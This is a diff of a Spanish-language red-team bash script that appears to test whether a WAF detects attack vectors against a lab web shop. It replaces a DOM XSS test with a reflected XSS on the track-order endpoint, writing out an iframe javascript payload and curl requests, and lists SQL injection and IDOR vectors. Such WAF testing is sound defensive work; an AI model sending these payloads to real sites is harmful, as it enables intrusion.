@@ -126,20 +126,25 @@ fi
 IDS+=("V-02"); VECT+=("SQLi UNION exfiltración"); SEES+=("Sí (942xxx)"); OBS+=("$code"); verdict_sees "$code"
 
 # ----------------------------------------------------------------------------
-# V-03 · DOM XSS en búsqueda  (BO-5/SO-5 · el '#' NO llega al WAF; sí la API)
-#   El WAF solo puede ver la llamada API /rest/products/search?q=<payload> (941xxx).
-#   La ejecución real en navegador se demuestra con la PoC H2 (xss-check.js).
+# V-03 · XSS reflejado en rastreo de pedidos  (BO-5/SO-5 · 941xxx · WAF SÍ lo ve)
+#   Se usa el vector de track-order, NO el DOM XSS de la búsqueda: en la búsqueda
+#   el payload se aplica solo en el cliente (search-result.component: carga con
+#   search('') vacío y hace bypassSecurityTrustHtml(q) en el navegador), así que
+#   /rest/products/search?q=<payload> sería una petición ARTIFICIAL que el navegador
+#   de la víctima nunca manda. En track-order el navegador SÍ envía el payload por
+#   el path (track-order.service: encodeURIComponent -> GET /rest/track-order/<id>),
+#   que cruza el WAF y es la misma petición que dispara AC-03 del Blue Team.
 # ----------------------------------------------------------------------------
-echo; echo "[V-03] DOM XSS  GET /rest/products/search?q=<iframe src=javascript:alert(\`xss\`)>"
-d="$EVID/V-03-xss-dom-search"; mkdir -p "$d"
+echo; echo "[V-03] XSS reflejado  GET /rest/track-order/<iframe src=javascript:alert(\`xss\`)>"
+d="$EVID/V-03-xss-track-order"; mkdir -p "$d"
 XSS='<iframe src="javascript:alert(`xss`)">'
 echo "$XSS" > "$d/payload.txt"
-code=$(curl -s -A "$RUN-V03" -G "$BASE_URL/rest/products/search" --data-urlencode "q=$XSS" \
-  -o "$d/response.json" -w '%{http_code}')
-echo "  -> HTTP $code (veredicto del WAF sobre la llamada API; el DOM XSS en sí se ejecuta en el cliente)"
+ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$XSS")
+echo "$BASE_URL/#/track-result?id=$ENC" > "$d/repro-url.txt"
+code=$(curl -s -A "$RUN-V03" "$BASE_URL/rest/track-order/$ENC" -o "$d/response.json" -w '%{http_code}')
+echo "  -> HTTP $code (misma petición que hace el navegador de la víctima al abrir repro-url.txt)"
 echo "$code" > "$d/http_code.txt"
-echo "nota: el fragmento #/search?q=... no viaja al WAF; la ejecución del alert se prueba con red-team/poc/V-03-xss-dom-search (PLAYWRIGHT_DIR)." > "$d/nota.txt"
-IDS+=("V-03"); VECT+=("DOM XSS (vía API)"); SEES+=("Sí en la API (941xxx)"); OBS+=("$code"); verdict_sees "$code"
+IDS+=("V-03"); VECT+=("XSS reflejado (track-order)"); SEES+=("Sí (941xxx)"); OBS+=("$code"); verdict_sees "$code"
 
 # ----------------------------------------------------------------------------
 # V-04 · IDOR de carrito  (BO-3/SO-1 · F3 petición legítima, SIN payload · WAF NO lo ve)
